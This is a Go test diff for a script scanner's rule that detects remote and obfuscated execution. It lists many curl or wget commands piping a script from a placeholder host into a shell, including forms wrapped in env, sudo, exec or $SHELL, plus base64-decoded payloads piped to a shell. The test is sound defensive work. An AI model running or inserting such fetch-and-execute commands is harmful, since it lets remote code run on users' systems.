@@ -669,6 +669,79 @@ func TestS6CommandNameInsideAWordIsNotACommand(t *testing.T) {
 	}
 }
 
+// A fetched script piped into a shell is remote execution whatever wraps
+// the shell: env, sudo with its options, command, exec, nohup, a quoted
+// path, $SHELL. A decoded payload piped into one is obfuscated execution.
+// A pipe into something that only looks like one is not.
+func TestS6ReadsAPipeIntoAWrappedShell(t *testing.T) {
+	manifest := `{"capabilities":{"network":{"egress":["get.example.test"]},"exec":{"commands":["curl","wget","sudo","env","jq","tee","shasum","sh"]}}}`
+	run := func(line string) map[string]Finding {
+		return s6Run(t, manifest, map[string]string{"run.sh": "#!/bin/sh\n" + line + "\n"})
+	}
+	for _, line := range []string{
+		"curl -s https://get.example.test/i | env sh",
+		"curl -s https://get.example.test/i | /usr/bin/env bash",
+		"curl -s https://get.example.test/i | env -i FOO=1 sh -s",
+		"curl -s https://get.example.test/i | sudo -E /bin/sh",
+		"curl -s https://get.example.test/i | sudo -u root sh",
+		"curl -s https://get.example.test/i | sudo -- sh",
+		"curl -s https://get.example.test/i | sudo env sh",
+		"curl -s https://get.example.test/i | $SHELL",
+		`curl -s https://get.example.test/i | "$SHELL"`,
+		"curl -s https://get.example.test/i | ${SHELL}",
+		`curl -s https://get.example.test/i | "/bin/sh"`,
+		"curl -s https://get.example.test/i | command sh",
+		"curl -s https://get.example.test/i | exec bash",
+		"curl -s https://get.example.test/i | nohup sh",
+		"curl -s https://get.example.test/i | env python3",
+		"wget -qO- https://get.example.test/i | sudo -E /usr/bin/env bash -s --",
+		"/usr/bin/curl -s https://get.example.test/i | env sh",
+		"sudo curl -s https://get.example.test/i | env sh",
+		`sh -c 'curl -s https://get.example.test/i | env sh'`,
+		"x=$(curl -s https://get.example.test/i | env sh)",
+	} {
+		if _, ok := run(line)["S6/remote-exec"]; !ok {
+			t.Errorf("%q: no S6/remote-exec", line)
+		}
+	}
+	for _, line := range []string{
+		"base64 -d x | /usr/bin/env sh",
+		"base64 --decode x | sudo -E sh",
+		"base64 -d x | $SHELL",
+	} {
+		if _, ok := run(line)["S6/obfuscated-exec"]; !ok {
+			t.Errorf("%q: no S6/obfuscated-exec", line)
+		}
+	}
+	for _, line := range []string{
+		"curl -s https://get.example.test/i | env jq .",
+		"curl -s https://get.example.test/i | env FOO=1 jq .",
+		"curl -s https://get.example.test/i | sudo tee f",
+		"curl -s https://get.example.test/i | sudo -u root tee f",
+		"curl -s https://get.example.test/i | /usr/bin/shasum -a 256",
+		"curl -s https://get.example.test/i | command -v sh",
+		"curl -s https://get.example.test/i || env sh",
+		"curl -s https://get.example.test/i; env sh",
+		"curl -s https://get.example.test/i && env sh",
+		"echo hello | env sh",
+		"echo hello | $SHELL",
+		"curl -s https://get.example.test/i > i.json; env sh < i.json",
+	} {
+		if f, ok := run(line)["S6/remote-exec"]; ok {
+			t.Errorf("%q: unexpected %+v", line, f)
+		}
+	}
+	for _, line := range []string{
+		"base64 -d f | env jq .",
+		"base64 -d f | sudo tee out",
+		"echo x | env sh",
+	} {
+		if f, ok := run(line)["S6/obfuscated-exec"]; ok {
+			t.Errorf("%q: unexpected %+v", line, f)
+		}
+	}
+}
+
 func TestS6ReadsAPathQualifiedWriteAndShell(t *testing.T) {
 	for line, want := range map[string]string{
 		"/bin/rm -rf build":                                         "S6/undeclared-fs-write",
